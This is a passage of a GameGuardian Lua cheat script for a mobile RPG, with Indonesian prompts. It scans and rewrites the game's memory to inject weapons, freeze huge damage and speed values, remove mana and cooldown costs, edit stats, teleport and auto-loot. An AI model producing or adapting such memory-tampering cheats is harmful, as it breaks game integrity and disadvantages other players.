        "◤─〔 BASIC JOB 〕",
        "│⦿ 〔 " .. (switches[1] and ON or OFF) .. " Swords 〕",
        "│⦿ 〔 " .. (switches[2] and ON or OFF) .. " Archer 〕",
        "│⦿ 〔 " .. (switches[3] and ON or OFF) .. " Mage 〕",
        "│⦿ 〔 " .. (switches[4] and ON or OFF) .. " Tank 〕",
        "│⦿ 〔 HIDE MENU 〕",
        "│⦿ 〔 🔚【BACK】🔚 〕"
    }, nil, createMenuTitle("BASIC WEAPON"))

    if basicA == nil then return end

    if basicA == 1 then basicweapon()
    elseif basicA == 2 then sw()
    elseif basicA == 3 then ar()
    elseif basicA == 4 then mg()
    elseif basicA == 5 then pl()
    elseif basicA == 6 then HideMenu()
    elseif basicA == 7 then Back()
    end
end

function extraweapon()
    gg.setVisible(false)
    local basicB = SafeChoice({
        "◤─〔 EXTRA JOB 〕",
        "│⦿ 〔 " .. (switches[5] and ON or OFF) .. " Samurai 〕",
        "│⦿ 〔 " .. (switches[6] and ON or OFF) .. " Sinobi 〕",
        "│⦿ 〔 " .. (switches[7] and ON or OFF) .. " Mana Slinger 〕",
        "│⦿ 〔 " .. (switches[8] and ON or OFF) .. " Guardian 〕",
        "│⦿ 〔 HIDE MENU 〕",
        "│⦿ 〔 🔚【BACK】🔚 〕"
    }, nil, createMenuTitle("EXTRA WEAPON"))

    if basicB == nil then return end

    if basicB == 1 then extraweapon()
    elseif basicB == 2 then sa()
    elseif basicB == 3 then si()
    elseif basicB == 4 then ms()
    elseif basicB == 5 then grd()
    elseif basicB == 6 then HideMenu()
    elseif basicB == 7 then Back()
    end
end

function bag()
    gg.setVisible(false)
    local nbag = SafeMultiChoice({
        "◤─〔 STORAGE/MARKET 〕",
        "│⦿ 〔 STORAGE 〕",
        "│⦿ 〔 MARKET 〕",
        "│⦿ 〔 EMBLEM 〕",
        "◣─❈ 「 BACK 」─✦"
    }, nil, createMenuTitle("STORAGE & MARKET"))

    if nbag == nil then return end

    if nbag[1] then bag()
    elseif nbag[2] then BG()
    elseif nbag[3] then BM()
    elseif nbag[4] then EMB()
    elseif nbag[5] then Back()
    end
end

function areaF()
    gg.setVisible(false)
    local areaFmenu = SafeMultiChoice({
        "◤─〔 AREA FARM 〕",
        "│⦿ 〔 GALERIA PLAIN II 〕", "│⦿ 〔 LUKKA FOREST 〕", "│⦿ 〔 MANQUE LIRO II 〕",
        "│⦿ 〔 CAPE INUWASHI III 〕", "│⦿ 〔 SETA GRIA OUTER 〕", "│⦿ 〔 EVEHOM PLAINS 〕",
        "│⦿ 〔 DEFINITION ORE 24/25 〕", "│⦿ 〔 HIDE MENU 〕",
        "◣─❈ 「 BACK 」─✦"
    }, nil, createMenuTitle("AREA FARM"))

    if areaFmenu == nil then return end

    local areaFuncs = { gp, lf, ml, ci, st, ev, dev }
    if areaFmenu[1] then areaF()
    else
        for i = 2, 8 do if areaFmenu[i] then areaFuncs[i - 1]() end end
        if areaFmenu[9] then HideMenu() end
        if areaFmenu[10] then Back() end
    end
end

function lootF()
    gg.setVisible(false)
    local lootFmenu = SafeMultiChoice({
        "◤─〔 AUTO LOOTING 〕",
        "│⦿ 〔 GALERIA PLAIN II 〕", "│⦿ 〔 LUKKA FOREST 〕", "│⦿ 〔 MANQUE LIRO II 〕",
        "│⦿ 〔 CAPE INUWASHI III 〕", "│⦿ 〔 SETA GRIA OUTER 〕", "│⦿ 〔 EVEHOM PLAINS 〕",
        "│⦿ 〔 DEFINITION ORE 24/25 〕", "│⦿ 〔 HIDE MENU 〕",
        "◣─❈ 「 BACK 」─✦"
    }, nil, createMenuTitle("AUTO LOOTING"))

    if lootFmenu == nil then return end

    local lootFuncs = { lgp0, llf0, lml0, lci0, lst0, lev0, ldev0 }
    if lootFmenu[1] then lootF()
    else
        for i = 2, 8 do if lootFmenu[i] then lootFuncs[i - 1]() end end
        if lootFmenu[9] then HideMenu() end
        if lootFmenu[10] then Back() end
    end
end

-- ============================================================================
-- 8. WEAPON INJECTION FUNCTIONS (OPTIMIZED)
-- ============================================================================

function sw()
    injectWeaponPattern({
        { searchHex = "h 03 00 00 00 1E 00 00 00 01 00 00 00 02 00 00 00", refineNum = "3", edits = {{offset=28},{offset=32},{offset=36},{offset=40}} },
        { searchHex = "h 04 00 00 00 1F 00 00 00 01 00 00 00 02 00 00 00", refineNum = "4", edits = {{offset=28},{offset=32},{offset=36},{offset=40}} },
        { searchHex = "h 0E 00 00 00 28 00 00 00 02 00 00 00 02 00 00 00 05 00 00 00 03 00 00 00", refineNum = "14", edits = {{offset=44},{offset=48}} },
        { searchHex = "h 12 00 00 00 2D 00 00 00 02 00 00 00 02 00 00 00 05 00 00 00 04 00 00 00", refineNum = "18", edits = {{offset=44},{offset=48}} },
        { searchHex = "h 16 00 00 00 31 00 00 00 02 00 00 00 02 00 00 00 05 00 00 00", refineNum = "22", edits = {{offset=44},{offset=48}} },
        { searchHex = "h 0A 00 00 00 25 00 00 00 01 00 00 00 02 00 00 00", refineNum = "10", edits = {{offset=28},{offset=32},{offset=36},{offset=40}} }
    }, "Sword Inject", 1)
end

function ar()
    injectWeaponPattern({
        { searchHex = "h 08 00 00 00 23 00 00 00 01 00 00 00 04 00 00 00", refineNum = "8", edits = {{offset=28},{offset=32},{offset=36},{offset=40}} },
        { searchHex = "h 07 00 00 00 22 00 00 00 01 00 00 00 04 00 00 00", refineNum = "7", edits = {{offset=28},{offset=32},{offset=36},{offset=40}} },
        { searchHex = "h 0C 00 00 00 27 00 00 00 01 00 00 00 04 00 00 00", refineNum = "12", edits = {{offset=28},{offset=32},{offset=36},{offset=40}} },
        { searchHex = "h 10 00 00 00 2B 00 00 00 02 00 00 00 04 00 00 00 06 00 00 00 03 00 00 00", refineNum = "16", edits = {{offset=44},{offset=48}} },
        { searchHex = "h 14 00 00 00 2F 00 00 00 02 00 00 00 04 00 00 00 06 00 00 00 04 00 00 00", refineNum = "20", edits = {{offset=44},{offset=48}} },
        { searchHex = "h 18 00 00 00 33 00 00 00 02 00 00 00 04 00 00 00", refineNum = "24", edits = {{offset=44},{offset=48}} }
    }, "Archer Inject", 2)
end

function mg()
    injectWeaponPattern({
        { searchHex = "h 06 00 00 00 21 00 00 00 01 00 00 00 03 00 00 00", refineNum = "6", edits = {{offset=28},{offset=32},{offset=36},{offset=40}} },
        { searchHex = "h 05 00 00 00 20 00 00 00 01 00 00 00 03 00 00 00", refineNum = "5", edits = {{offset=28},{offset=32},{offset=36},{offset=40}} },
        { searchHex = "h 0B 00 00 00 26 00 00 00 01 00 00 00 03 00 00 00", refineNum = "11", edits = {{offset=28},{offset=32},{offset=36},{offset=40}} },
        { searchHex = "h 0F 00 00 00 2A 00 00 00 02 00 00 00 03 00 00 00 08 00 00 00 03 00 00 00", refineNum = "15", edits = {{offset=44},{offset=48}} },
        { searchHex = "h 13 00 00 00 2E 00 00 00 02 00 00 00 03 00 00 00 08 00 00 00 04 00 00 00", refineNum = "19", edits = {{offset=44},{offset=48}} },
        { searchHex = "h 17 00 00 00 32 00 00 00 02 00 00 00 03 00 00 00 08 00 00 00 05 00 00 00", refineNum = "23", edits = {{offset=44},{offset=48}} }
    }, "Mage Inject", 3)
end

function pl()
    injectWeaponPattern({
        { searchHex = "h 02 00 00 00 1D 00 00 00 01 00 00 00 01 00 00 00", refineNum = "2", edits = {{offset=28},{offset=32},{offset=36},{offset=40}} },
        { searchHex = "h 01 00 00 00 1C 00 00 00 01 00 00 00 01 00 00 00", refineNum = "1", edits = {{offset=28},{offset=32},{offset=36},{offset=40}} },
        { searchHex = "h 09 00 00 00 24 00 00 00 01 00 00 00 01 00 00 00", refineNum = "9", edits = {{offset=28},{offset=32},{offset=36},{offset=40}} },
        { searchHex = "h 0D 00 00 00 29 00 00 00 02 00 00 00 01 00 00 00 07 00 00 00 03 00 00 00", refineNum = "13", edits = {{offset=44},{offset=48}} },
        { searchHex = "h 11 00 00 00 2C 00 00 00 02 00 00 00 01 00 00 00 07 00 00 00 04 00 00 00", refineNum = "17", edits = {{offset=44},{offset=48}} },
        { searchHex = "h 15 00 00 00 30 00 00 00 02 00 00 00 01 00 00 00 07 00 00 00 05 00 00 00", refineNum = "21", edits = {{offset=44},{offset=48}} }
    }, "Tank Inject", 4)
end

function sa()
    injectWeaponPattern({
        { searchHex = "h 2A 00 00 00 07 14 00 00 01 00 00 00 05 00 00 00", refineNum = "42", edits = {{offset=28},{offset=32},{offset=36},{offset=40}} },
        { searchHex = "h 2B 00 00 00 08 14 00 00 01 00 00 00 05 00 00 00", refineNum = "43", edits = {{offset=28},{offset=32},{offset=36},{offset=40}} },
        { searchHex = "h 0E 00 00 00 28 00 00 00 02 00 00 00 02 00 00 00 05 00 00 00 03 00 00 00", refineNum = "14", edits = {{offset=44},{offset=48}} },
        { searchHex = "h 12 00 00 00 2D 00 00 00 02 00 00 00 02 00 00 00 05 00 00 00 04 00 00 00", refineNum = "18", edits = {{offset=44},{offset=48}} },
        { searchHex = "h 16 00 00 00 31 00 00 00 02 00 00 00 02 00 00 00 05 00 00 00", refineNum = "22", edits = {{offset=44},{offset=48}} }
    }, "Samurai Inject", 5)
end

function si()
    injectWeaponPattern({
        { searchHex = "h 32 00 00 00 D0 18 00 00 01 00 00 00 06 00 00 00", refineNum = "50", edits = {{offset=28},{offset=32},{offset=36},{offset=40}} },
        { searchHex = "h 33 00 00 00 D1 18 00 00 01 00 00 00 06 00 00 00", refineNum = "51", edits = {{offset=28},{offset=32},{offset=36},{offset=40}} },
        { searchHex = "h 10 00 00 00 2B 00 00 00 02 00 00 00 04 00 00 00 06 00 00 00 03 00 00 00", refineNum = "16", edits = {{offset=44},{offset=48}} },
        { searchHex = "h 14 00 00 00 2F 00 00 00 02 00 00 00 04 00 00 00 06 00 00 00 04 00 00 00", refineNum = "20", edits = {{offset=44},{offset=48}} },
        { searchHex = "h 18 00 00 00 33 00 00 00 02 00 00 00 04 00 00 00", refineNum = "24", edits = {{offset=44},{offset=48}} }
    }, "Sinobi Inject", 6)
end

function ms()
    injectWeaponPattern({
        { searchHex = "h 3C 00 00 00 0C 1D 00 00 01 00 00 00 08 00 00 00", refineNum = "60", edits = {{offset=28},{offset=32},{offset=36},{offset=40}} },
        { searchHex = "h 3D 00 00 00 0D 1D 00 00 01 00 00 00 08 00 00 00", refineNum = "61", edits = {{offset=28},{offset=32},{offset=36},{offset=40}} },
        { searchHex = "h 0F 00 00 00 2A 00 00 00 02 00 00 00 03 00 00 00 08 00 00 00 03 00 00 00", refineNum = "15", edits = {{offset=44},{offset=48}} },
        { searchHex = "h 13 00 00 00 2E 00 00 00 02 00 00 00 03 00 00 00 08 00 00 00 04 00 00 00", refineNum = "19", edits = {{offset=44},{offset=48}} },
        { searchHex = "h 17 00 00 00 32 00 00 00 02 00 00 00 03 00 00 00 08 00 00 00 05 00 00 00", refineNum = "23", edits = {{offset=44},{offset=48}} }
    }, "Mana Inject", 7)
end

function grd()
    injectWeaponPattern({
        { searchHex = "h 37 00 00 00 5C 1B 00 00 01 00 00 00 07 00 00 00", refineNum = "55", edits = {{offset=28},{offset=32},{offset=36},{offset=40}} },
        { searchHex = "h 38 00 00 00 5D 1B 00 00 01 00 00 00 07 00 00 00", refineNum = "56", edits = {{offset=28},{offset=32},{offset=36},{offset=40}} },
        { searchHex = "h 0D 00 00 00 29 00 00 00 02 00 00 00 01 00 00 00 07 00 00 00 03 00 00 00", refineNum = "13", edits = {{offset=44},{offset=48}} },
        { searchHex = "h 11 00 00 00 2C 00 00 00 02 00 00 00 01 00 00 00 07 00 00 00 04 00 00 00", refineNum = "17", edits = {{offset=44},{offset=48}} },
        { searchHex = "h 15 00 00 00 30 00 00 00 02 00 00 00 01 00 00 00 07 00 00 00 05 00 00 00", refineNum = "21", edits = {{offset=44},{offset=48}} }
    }, "Guardian Inject", 8)
end

-- ============================================================================
-- 9. FEATURE IMPLEMENTATIONS & CHEATS
-- ============================================================================

function statusedit()
    if not spendCoin() then return end
    gg.clearResults()
    gg.setVisible(false)

    local originalMove = gg.prompt({ "Masukan Jumlah Move Speed Original Anda" }, { "" }, { "number" })
    if not originalMove or not originalMove[1] or originalMove[1] == "" then
        gg.alert("Input dibatalkan, kembali ke menu.")
        return PLAYER()
    end

    local moveValue = tonumber(originalMove[1])
    gg.setRanges(gg.REGION_JAVA_HEAP)
    gg.searchNumber("211;" .. moveValue .. ";200:233", gg.TYPE_DWORD)

    if gg.getResultCount() == 0 then
        gg.clearResults()
        gg.alert("Pattern 211;" .. moveValue .. ";200:233 tidak ditemukan.")
        return statusedit()
    end

    gg.refineNumber("211", gg.TYPE_DWORD)
    local searchResults = gg.getResults(100)
    gg.clearResults()

    local validAddresses = {}
    for _, result in ipairs(searchResults) do
        local baseAddr = result.address
        local checkMove = gg.getValues({{ address = baseAddr + 208, flags = gg.TYPE_DWORD }})
        local check200  = gg.getValues({{ address = baseAddr + 232, flags = gg.TYPE_DWORD }})

        if checkMove and checkMove[1] and checkMove[1].value == moveValue and check200 and check200[1] and check200[1].value == 200 then
            table.insert(validAddresses, baseAddr)
        end
    end

    if #validAddresses == 0 then
        gg.alert("Tidak ditemukan address valid.")
        return statusedit()
    end

    local targetAddress = validAddresses[1]
    local editOptions = gg.prompt({
        "Damage:", "Move Speed:", "☐ Anti Mana", "☐ Anti Cooldown"
    }, { "999999999", "10000", false, false }, { "number", "number", "checkbox", "checkbox" })

    if not editOptions then return PLAYER() end

    local editTable = {
        { address = targetAddress + 136, flags = gg.TYPE_DWORD, value = editOptions[1], freeze = true },
        { address = targetAddress + 208, flags = gg.TYPE_DWORD, value = editOptions[2], freeze = true }
    }

    if editOptions[3] then table.insert(editTable, { address = targetAddress + 512, flags = gg.TYPE_DWORD, value = "-999", freeze = true }) end
    if editOptions[4] then table.insert(editTable, { address = targetAddress + 508, flags = gg.TYPE_DWORD, value = "-999", freeze = true }) end

    gg.setValues(editTable)
    gg.addListItems(editTable)
    gg.toast("✅ Status berhasil diupdate!")
    return PLAYER()
end

function statusbs()
    if not spendCoin() then return end
    gg.setVisible(false)
    gg.clearResults()

    local input = gg.prompt({
        "STR (Strength):", "VIT (Vitality):", "INT (Intelligence):", "DEX (Dexterity):", "MEN (Mentality):"
    }, { "", "", "", "", "" }, { "number", "number", "number", "number", "number" })

    if not input then return end

    local STAT_NAMES = { "STR", "VIT", "INT", "DEX", "MEN" }
    local STAT_OFFSETS = { 0, 4, 8, 12, 16 }
    local searchParts = {}

    for i, valStr in ipairs(input) do
        local val = tonumber(valStr) or 0
        if val > 0 then
            local minVal = math.max(0, val - 20)
            local maxVal = val + 20
            table.insert(searchParts, minVal .. "~" .. maxVal)
        end
    end

    if #searchParts == 0 then
        gg.alert("❌ Minimal satu status harus diisi!")
        return
    end

    local searchString = table.concat(searchParts, ";") .. ":17"
    if not searchInDalvikMainSpace(searchString, gg.TYPE_DWORD) then
        gg.alert("❌ Status encode tidak ditemukan!")
        return
    end

    gg.searchFuzzy("0", gg.SIGN_FUZZY_EQUAL, gg.TYPE_DWORD, 0, -1, 0)
    local results = gg.getResults(100)

    local targetResult = nil
    for _, r in ipairs(results) do
        local check = gg.getValues({{ address = r.address - 4, flags = gg.TYPE_DWORD }})
        if check and check[1] and check[1].value == 0 then
            targetResult = r
            break
        end
    end

    if not targetResult then
        gg.alert("❌ Value valid tidak ditemukan!")
        return
    end

    local editInput = gg.prompt({
        "STR Baru:", "VIT Baru:", "INT Baru:", "DEX Baru:", "MEN Baru:"
    }, { "", "", "", "", "" }, { "number", "number", "number", "number", "number" })

    if not editInput then return end

    local editList = {}
    for i, valStr in ipairs(editInput) do
        local newVal = tonumber(valStr)
        if newVal then
            table.insert(editList, {
                address = targetResult.address + STAT_OFFSETS[i],
                flags = gg.TYPE_DWORD,
                value = newVal
            })
        end
    end

    if #editList > 0 then
        gg.setValues(editList)
        gg.toast("✅ " .. #editList .. " status berhasil diedit!")
    end
end

function rc()
    if not spendCoin() then return end
    gg.clearResults()
    gg.setVisible(false)

    gg.toast('🔍 SEARCHING CHARACTER DATA...')
    if searchInDalvikMainSpace('8;65,792;16,777,217;1:29', gg.TYPE_DWORD) then
        gg.refineNumber('8', gg.TYPE_DWORD)
    end

    local res = gg.getResults(1)
    if not res or #res == 0 then
        gg.alert('❌ NO CHARACTER DATA FOUND!')
        return
    end

    local baseAddr = res[1].address
    local savedItems = {
        { address = baseAddr - 0x38, flags = gg.TYPE_DWORD, freeze = false, name = 'COLOR' },
        { address = baseAddr - 0x8,  flags = gg.TYPE_DWORD, freeze = false, name = 'JOB' },
        { address = baseAddr - 0x4,  flags = gg.TYPE_DWORD, freeze = false, name = 'GENDER' },
        { address = baseAddr + 0x0,  flags = gg.TYPE_DWORD, freeze = false, name = 'FACE' },
        { address = baseAddr + 0x4,  flags = gg.TYPE_DWORD, freeze = false, name = 'HAIR' }
    }
    gg.addListItems(savedItems)

    while true do
        for _, v in ipairs(savedItems) do
            if v.name == 'COLOR' then v.value = math.random(0, 15) end
            if v.name == 'JOB' then v.value = math.random(0, 3) end
            if v.name == 'GENDER' then v.value = math.random(0, 1) end
            if v.name == 'FACE' then v.value = math.random(0, 32) end
            if v.name == 'HAIR' then v.value = math.random(0, 9) end
        end
        gg.setValues(savedItems)

        local mr = gg.alert("🎲 CHARACTER RANDOMIZED!\nLanjut acak karakter lagi?", "NEXT", "SAVE")
        if mr ~= 1 then break end
    end
    gg.alert('✅ RANDOMIZE COMPLETED!')
end

-- Storage / Market / Emblem Shortcut
local function openMenuCode(codeVal)
    if not spendCoin() then return end
    gg.clearResults()
    gg.setVisible(false)
    if searchInDalvikMainSpace("h FF FF FF FF 02 00 00 00 FF FF FF FF 00 00 00 00 00 00 00 00", gg.TYPE_BYTE) then
        gg.processResume()
        gg.refineNumber("2", gg.TYPE_BYTE)
        local res = gg.getResults(1)
        if res and #res > 0 then
            gg.setValues({{ address = res[1].address + 4, flags = gg.TYPE_DWORD, value = codeVal, freeze = false }})
            gg.toast("✅ Menu ID " .. codeVal .. " Opened")
        end
    end
end

function BG() openMenuCode(12) end
function BM() openMenuCode(27) end
function EMB() openMenuCode(29) end

-- Area Farm Teleport / Map Edits
local function editAreaMap(patternStr)
    if not spendCoin() then return end
    gg.clearResults()
    gg.setVisible(false)
    gg.setRanges(gg.REGION_JAVA_HEAP)
    if searchInDalvikMainSpace(patternStr, gg.TYPE_DWORD) then
        gg.processResume()
        gg.refineNumber("1008981770", gg.TYPE_DWORD)
        local res = gg.getResults(100)
        if res and #res > 0 then
            gg.editAll("-1", gg.TYPE_DWORD)
        end
    end
    gg.clearResults()
    gg.processResume()
end

function gp() editAreaMap("4;1;1068708659;1008981770;1053609165;1068708659;1068708659;2566::50") end
function lf() editAreaMap("91;1;1065353216;1008981770;1067030938;1073741824;1073741824;2313::50") end
function ml() editAreaMap("15;1;1069547520;1008981770;1058642330;1072064102;1072064102;5379::50") end
function ci() editAreaMap("94;1;1065353216;1008981770;1058642330;1069128090;1069128090;2567::50") end
function st() editAreaMap("15D;1D;1065353216D;1008981770D;1058642330D;1072064102D;5379D:33") end
function ev() editAreaMap("95;1008981770::50") end

function dev()
    if not spendCoin() then return end
    local searchPatterns = {
        "17;1;1071644672;1008981770;1065353216;67109121;2570:33",
        "4;1;1068708659;1008981770;117440512;2566:33",
        "16;1;1069547520;1008981770;33554432;6410:33",
        "15;1;1065353216;1008981770;33554432;5379:33"
    }
    for _, pattern in ipairs(searchPatterns) do
        editAreaMap(pattern)
    end
end

-- Looting Shortcuts
function lgp0()
    if not spendCoin() then return end
    gg.setVisible(false)
    gg.processResume()
    gg.searchNumber("h33334542676656419A99BF42", gg.TYPE_BYTE)
    gg.refineNumber("-65", gg.TYPE_BYTE)
    local results = gg.getResults(100)
    if results and #results > 0 then
        gg.editAll("80", gg.TYPE_BYTE)
        local offsetList = {}
        for i, v in ipairs(results) do
            table.insert(offsetList, { address = v.address + 2, flags = gg.TYPE_DWORD, name = "loot" })
        end
        gg.addListItems(offsetList)
        gg.toast("Loot berhasil disimpan ke daftar")
    end
    gg.clearResults()
end

function lev0()
    if not spendCoin() then return end
    gg.setVisible(false)
    gg.processResume()
    gg.searchNumber("h9A99C14267660E4133335942", gg.TYPE_BYTE)
    gg.refineNumber("89", gg.TYPE_BYTE)
    local results = gg.getResults(100)
    if results and #results > 0 then
        gg.editAll("5", gg.TYPE_BYTE)
    end
    gg.clearResults()
end

function lst0()
    if not spendCoin() then return end
    gg.setVisible(false)
    gg.searchNumber("92", gg.TYPE_BYTE)
    local results = gg.getResults(100)
    if results then
        for _, v in ipairs(results) do v.value = 90 end
        gg.setValues(results)
    end
    gg.clearResults()
end

function ldev0()
    if not spendCoin() then return end
    gg.setVisible(false)
    gg.searchNumber("h33338E42CDCC8C403333B842", gg.TYPE_BYTE)
    gg.refineNumber("-72", gg.TYPE_BYTE)
    local results = gg.getResults(100)
    if results then
        for _, v in ipairs(results) do v.value = -90 end
        gg.setValues(results)
    end
    gg.clearResults()
end

-- Coin Missions (1 - 27)
function cc1() searchAndFreezeInDalvikMain("964;2;1:9", "404;1~3;255:9", "1185", "27", "Coin Mission 27") end
function cc2() searchAndFreezeInDalvikMain("964;2;1:9", "404;1~3;255:9", "1185", "53", "Coin Mission 53") end
function cc3() searchAndFreezeInDalvikMain("964;2;1:9", "404;1~3;255:9", "1185", "71", "Coin Mission 71") end
function cc4() searchAndFreezeInDalvikMain("964;2;1:9", "404;1~3;255:9", "1185", "79", "Coin Mission 79") end
function cc5() searchAndFreezeInDalvikMain("964;2;1:9", "404;1~3;255:9", "1185", "106", "Coin Mission 106") end
function cc6() searchAndFreezeInDalvikMain("964;2;1:9", "404;1~3;255:9", "1185", "129", "Coin Mission 129") end
function cc7() searchAndFreezeInDalvikMain("964;2;1:9", "404;1~3;255:9", "1185", "140", "Coin Mission 140") end
function cc8() searchAndFreezeInDalvikMain("964;2;1:9", "404;1~3;255:9", "1185", "164", "Coin Mission 164") end
function cc9() searchAndFreezeInDalvikMain("964;2;1:9", "404;1~3;255:9", "1185", "172", "Coin Mission 172") end
function cc10() searchAndFreezeInDalvikMain("964;2;1:9", "404;1~3;255:9", "1185", "202", "Coin Mission 202") end
function cc11() searchAndFreezeInDalvikMain("964;2;1:9", "404;1~3;255:9", "1185", "237", "Coin Mission 237") end
function cc12() searchAndFreezeInDalvikMain("964;2;1:9", "404;1~3;255:9", "1185", "245", "Coin Mission 245") end
function cc13() searchAndFreezeInDalvikMain("964;2;1:9", "404;1~3;255:9", "1185", "308", "Coin Mission 308") end
function cc14() searchAndFreezeInDalvikMain("964;2;1:9", "404;1~3;255:9", "1185", "320", "Coin Mission 320") end
function cc15() searchAndFreezeInDalvikMain("964;2;1:9", "404;1~3;255:9", "1185", "356", "Coin Mission 356") end
function cc16() searchAndFreezeInDalvikMain("964;2;1:9", "404;1~3;255:9", "1185", "367", "Coin Mission 367") end
function cc17() searchAndFreezeInDalvikMain("964;2;1:9", "404;1~3;255:9", "1185", "426", "Coin Mission 426") end
function cc18() searchAndFreezeInDalvikMain("964;2;1:9", "404;1~3;255:9", "1185", "503", "Coin Mission 503") end
function cc19() searchAndFreezeInDalvikMain("964;2;1:9", "404;1~3;255:9", "1185", "511", "Coin Mission 511") end
function cc20() searchAndFreezeInDalvikMain("964;2;1:9", "404;1~3;255:9", "1185", "563", "Coin Mission 563") end
function cc21() searchAndFreezeInDalvikMain("964;2;1:9", "404;1~3;255:9", "1185", "571", "Coin Mission 571") end
function cc22() searchAndFreezeInDalvikMain("964;2;1:9", "404;1~3;255:9", "1185", "664", "Coin Mission 664") end
function cc23() searchAndFreezeInDalvikMain("964;2;1:9", "404;1~3;255:9", "1185", "710", "Coin Mission 710") end
function cc24() searchAndFreezeInDalvikMain("964;2;1:9", "404;1~3;255:9", "1185", "716", "Coin Mission 716") end
function cc25() searchAndFreezeInDalvikMain("964;2;1:9", "404;1~3;255:9", "1185", "825", "Coin Mission 825") end
function cc26() searchAndFreezeInDalvikMain("964;2;1:9", "404;1~3;255:9", "1185", "916", "Coin Mission 916") end
function cc27()
    if not spendCoin() then return end
    gg.clearResults()
    gg.setVisible(false)
    if searchInDalvikMainSpace("404;1~3;255:9", gg.TYPE_DWORD) then
        local results = gg.getResults(100)
        if results then
            for _, v in ipairs(results) do
                if v.flags == gg.TYPE_DWORD then v.value = "1132" v.freeze = true end
            end
            gg.addListItems(results)
        end
        gg.clearResults()
    end
    gg.alert("🔒 Coin Mission 1132 dibekukan.")
end

-- Teleport Emblem & NPC Helpers
local function tpEmblem(destValue)
    if not spendCoin() then return end
    gg.clearResults()
    gg.setVisible(false)
    gg.setRanges(gg.REGION_JAVA_HEAP)
    if searchInDalvikMainSpace("404;1~3;255:9", gg.TYPE_DWORD) then
        gg.refineNumber("404", gg.TYPE_DWORD)
        local t = gg.getResults(100)
        for _, v in ipairs(t) do
            if v.flags == gg.TYPE_DWORD then v.value = destValue v.freeze = true end
        end
        gg.addListItems(t)
    end
    gg.sleep(1000)
    gg.clearList()
end

function tp1() tpEmblem("1201") end
function tp2() tpEmblem("39") end
function tp3() tpEmblem("1") end
function tp4() tpEmblem("1146") end
function tp5() tpEmblem("1107") end
function tp6() tpEmblem("1166") end
function tp7() tpEmblem("1156") end
function tp8() tpEmblem("286") end

local function tpNpc(destValue)
    if not spendCoin() then return end
    gg.clearResults()
    gg.setVisible(false)
    gg.setRanges(gg.REGION_JAVA_HEAP)
    if searchInDalvikMainSpace("964;2;1:9", gg.TYPE_DWORD) then
        gg.processResume()
        gg.refineNumber("964", gg.TYPE_DWORD)
        gg.editAll(destValue, gg.TYPE_DWORD)
    end
    gg.clearResults()
    gg.processResume()
end

function qsb1() tpNpc("346") end
function qsb2() tpNpc("610") end
function qsb3() tpNpc("1065") end
function qsb4() tpNpc("1143") end
function qsb5() tpNpc("1201") end
function qsb6() tpNpc("1185") end
function qsb7() tpNpc("961") end

-- Guild Mission Teleports
local function guildTp(patternStr)
    if not spendCoin() then return end
    gg.clearResults()
    gg.setVisible(false)
    gg.setRanges(gg.REGION_JAVA_HEAP)
    if searchInDalvikMainSpace(patternStr, gg.TYPE_DWORD) then
        gg.processResume()
        gg.refineNumber("1008981770", gg.TYPE_DWORD)
        gg.editAll("-2", gg.TYPE_DWORD)
    end
    gg.clearResults()
end

function ggtp1() guildTp("159;1;1077936128;1008981770;33554689;1054:33") end
function ggtp2() guildTp("129;1;1077936128;1008981770;50331905;1550:33") end
function ggtp3() guildTp("717;1;1080033280;1008981770;1061997773;1069547520;1073741824;33620225:29") end
function ggtp4() guildTp("657;1;1075838976;1008981770;16777473;2565:33") end
function ggtp5() guildTp("258;1;2.0F;1008981770;1.5F;67109121;1806:33") end

-- Gates
function g1() editAreaMap("212;1;1069547520;1008981770;50331905:29") end
function g2() editAreaMap("586;1;1065353216;1008981770;1080033280;16777473:29") end
function g3() editAreaMap("699;1;1065353216;1008981770;1069547520;1082549862;1082549862;16777473:29") end
function g4() editAreaMap("836;1008981770;1280;937::") end
function g5() editAreaMap("662D;1008981770;10280;949;662;1008981770;10280;950::") end
function g6() editAreaMap("257D;1008981770;2569D;1074D::") end
function g7() editAreaMap("1061;1008981770;2565;1154::") end
function g7e() editAreaMap("1061;1;1069547520;1008981770;1067450368;1074580685;1073741824;2565::") end
function g8() editAreaMap("865D;1008981770D;1554D;1181D::") end

-- Skill Edits
local function editJobSkill(skillName, skillValue)
    local savedData = gg.getListItems()
    local skillAddress = nil

    for _, v in ipairs(savedData) do
        if v.name == skillName then
            skillAddress = v.address
            break
        end
    end

    if not skillAddress then
        gg.clearResults()
        gg.setRanges(gg.REGION_JAVA_HEAP)
        if searchInDalvikMainSpace(skillValue .. ";5;5:9", gg.TYPE_DWORD) then
            local results = gg.getResults(100)
            for _, v in ipairs(results) do
                if v.value == skillValue then
                    skillAddress = v.address
                    break
                end
            end
            if skillAddress then
                gg.addListItems({{ address = skillAddress, flags = gg.TYPE_DWORD, name = skillName, value = skillValue }})
            end
        end
    end

    if not skillAddress then
        gg.alert("❌ Skill " .. skillName .. " tidak ditemukan!")
        return
    end

    local newValue = gg.prompt({ "Edit value " .. skillName .. ":" }, { "0" }, { "number" })
    if newValue and tonumber(newValue[1]) then
        gg.setValues({{ address = skillAddress, value = tonumber(newValue[1]), flags = gg.TYPE_DWORD }})
        gg.toast("✅ " .. skillName .. " diubah menjadi: " .. newValue[1])
    end
end

function Ssword() editJobSkill("Sword", 417) end
function Sarcher() editJobSkill("Archer", 419) end
function Smage() editJobSkill("Mage", 418) end
function Stank() editJobSkill("Tank", 416) end
function Tsamu() editJobSkill("Samurai", 420) end
function Tsino() editJobSkill("Sinobi", 421) end
function Tmana() editJobSkill("ManaSlinger", 423) end
function Tguardian() editJobSkill("Guardian", 422) end

-- Buff & Skill Loop
function Abuff()
    if not spendCoin() then return end
    gg.setVisible(false)
    gg.clearResults()
    gg.searchNumber("65536;212;1:17", gg.TYPE_DWORD)
    gg.refineNumber("212", gg.TYPE_DWORD)

    local results = gg.getResults(2000)
    if not results or #results == 0 then
        gg.toast("Pattern tidak ditemukan")
        return
    end

    local menu = gg.choice({ "🌾 Farm Buff", "📈 EXP Buff", "❌ Keluar" }, nil, "Pilih Mode Buff")
    if not menu or menu == 3 then return end

    local activeBuffs = (menu == 1) and {178,134,200,432,110,111,117,253,254,369,165,442,52,51}
                                   or {133,157,200,222,432,192,199,197,164,216,217,555,553,545,49,50,57,202}

    gg.toast("Mode Buff Aktif - Terapkan melalui menu pilihan")
end

function ls()
    if not spendCoin() then return end
    gg.clearResults()
    gg.setVisible(false)
    gg.setRanges(gg.REGION_JAVA_HEAP)
    gg.searchNumber("119;1;16777216:13", gg.TYPE_DWORD)
    gg.refineNumber("119", gg.TYPE_DWORD)
